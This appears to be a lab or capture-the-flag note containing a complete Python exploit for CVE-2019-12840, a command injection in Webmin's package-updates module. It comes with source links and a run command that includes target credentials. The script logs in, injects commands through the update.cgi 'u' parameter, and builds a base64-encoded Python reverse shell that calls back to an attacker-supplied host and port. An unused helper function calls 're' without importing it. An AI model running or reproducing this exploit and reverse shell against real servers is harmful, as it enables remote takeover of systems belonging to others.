____

1.910

https://raw.githubusercontent.com/KrE80r/webmin_cve-2019-12840_poc/master/CVE-2019-12840.py

https://packetstormsecurity.com/files/cve/CVE-2019-12840


```bash
python3 test.py -u https://10.10.10.160 -U Matt -P computer2008 -lhost 10.10.14.21 -lport 443
```

```python
#!/usr/bin/python3

import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import argparse
import sys
import base64

def CVE_2019_12840(url, auth_base64, cmd):
    vuln_url = url + '/package-updates/update.cgi'
    headers = {
        "User-Agent": "webmin",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": url + "package-updates/update.cgi?xnavigation=1"
    }

    payload = r'OBJECT CGI;print "Content-Type: Test\n\n";' + '$cmd=`%s`;print "$cmd";' % cmd
    r = requests.post(url=vuln_url, data=payload, headers=headers, verify=False)
    if r.status_code == 200 and 'Content-type' in r.text:
        m = re.findall(r"(.+?)\nContent-type: text/plain", r.text, re.S)
    else:
        sys.exit(1)

def login(username, password, url):
    print("[*] logging in ...")
    session = requests.Session()
    session.cookies["testing"] = "1"
    data = {'page': '', 'user': username, 'pass': password}
    loginurl = url + "/session_login.cgi"
    res = session.post(loginurl, data=data, verify=False, allow_redirects=False)

    if res.status_code != 302 or session.cookies.get("sid") is None:
        print("[-] Failed to login!!")
        sys.exit(1)
    else:
        return session.cookies["sid"]

def exploit(sid, url, cmd):
    print("[*] sending command", cmd)
    session = requests.Session()
    referer = url + "/package-updates/update.cgi?xnavigation=1"
    cookies = "Cookie: redirect=1; testing=1;sid=" + sid
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": referer,
        "X-Progressive-URL": url + "package-updates/update.cgi",
        "X-Requested-From": "package-updates",
        "X-Requested-From-Tab": "webmin",
        "X-Requested-With": "XMLHttpRequest",
        "Cookie": cookies
    }
    data = "mode=updates&search=&u=apt/apt&u=;" + cmd + ";/apt&ok_top=Update+Selected+Packages"
    updateurl = url + "/package-updates/update.cgi"
    res = session.post(updateurl, data=data, headers=headers, verify=False)
    if res.status_code == 200:
        print(res.text)
        print("[+] exploit finished successfully!!")

def b64revshell(lhost, lport):
    payload = "python -c \"import base64;exec(base64.b64decode('"
    shellcode = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ lhost + "\"," + lport + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])"
    shellcode = str.encode(shellcode)
    encoded = base64.b64encode(shellcode)
    encoded = encoded.decode("utf-8")
    closing = "'))\""
    payload += encoded
    payload += closing
    return payload

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-U", dest="username", help="username", required=True)
    parser.add_argument("-P", dest="password", help="password", required=True)
    parser.add_argument("-u", dest="url", help="target url", required=True)
    parser.add_argument("-p", dest="port", default="10000", help="target port")
    parser.add_argument("-lport", dest="lport", default="443", help="local port for reverse shell")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-c", dest="cmd", help="command to execute")
    group.add_argument("-lhost", dest="lhost", help="Send back a reverse shell at port 443")
    args = parser.parse_args()
    baseurl = args.url + ':' + args.port
    sid = login(args.username, args.password, baseurl)
    sid = sid.strip()
    print("[+] got sid", sid)
    if args.cmd:
        exploit(sid, baseurl, args.cmd)
    elif args.lhost:
        rev = b64revshell(args.lhost, args.lport)
        exploit(sid, baseurl, rev)

```
